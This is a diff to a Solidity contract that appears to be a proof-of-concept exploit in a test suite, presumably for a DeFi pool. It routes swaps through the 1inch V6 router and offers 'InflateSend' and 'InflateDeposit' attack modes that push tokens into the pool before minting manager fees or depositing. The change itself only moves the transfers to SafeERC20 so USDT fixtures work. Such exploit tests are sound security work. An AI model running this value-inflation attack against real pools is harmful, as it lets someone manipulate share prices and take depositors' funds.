@@ -7,6 +7,10 @@ import {ISwapDataConsumingGuard} from "../interfaces/guards/ISwapDataConsumingGu
 import {ISwapper} from "../interfaces/flatMoney/swapper/ISwapper.sol";
 import {IPoolLogic} from "../interfaces/IPoolLogic.sol";
 import {IERC20} from "../interfaces/IERC20.sol";
+// Aliased so SafeERC20 can drive the transfers: the debt asset is USDT on some fixtures, whose
+// transfer returns no value and reverts the strict IERC20 above while decoding.
+import {IERC20 as IERC20OZ} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/SafeERC20.sol";
 
 interface IAggregationRouterV6 {
   struct SwapDescription {
@@ -28,6 +32,8 @@ interface IAggregationRouterV6 {
 
 // only for case that there is one srcToken(collateral asset) element in the srcTokenSwapDetails array (type is ISwapper.SrcTokenSwapDetails[]);
 contract AaveWithdrawTrickContract {
+  using SafeERC20 for IERC20OZ;
+
   bytes public mSwapData;
   ISwapper.SrcTokenSwapDetails[] public tokensDetails;
   address public destToken;
@@ -97,15 +103,15 @@ contract AaveWithdrawTrickContract {
   function execute(address) public returns (uint256) {
     // send destToken to get swapper satisfied with the swapData.destData.minDestAmount
     count += 1;
-    IERC20(destToken).transfer(EthereumConfig.ONE_INCH_V6_ROUTER, destAmount);
+    IERC20OZ(destToken).safeTransfer(EthereumConfig.ONE_INCH_V6_ROUTER, destAmount);
 
     if (count == tokensDetails.length) {
       if (AttackType.InflateSend == attackType) {
         // Transfer all dstToken in this contract to the pool
-        IERC20(destToken).transfer(address(pool), IERC20(destToken).balanceOf(address(this)));
+        IERC20OZ(destToken).safeTransfer(address(pool), IERC20(destToken).balanceOf(address(this)));
         pool.mintManagerFee();
       } else if (AttackType.InflateDeposit == attackType) {
-        IERC20(destToken).approve(address(pool), IERC20(destToken).balanceOf(address(this)));
+        IERC20OZ(destToken).safeApprove(address(pool), IERC20(destToken).balanceOf(address(this)));
         pool.deposit(destToken, IERC20(destToken).balanceOf(address(this)));
       }
     }
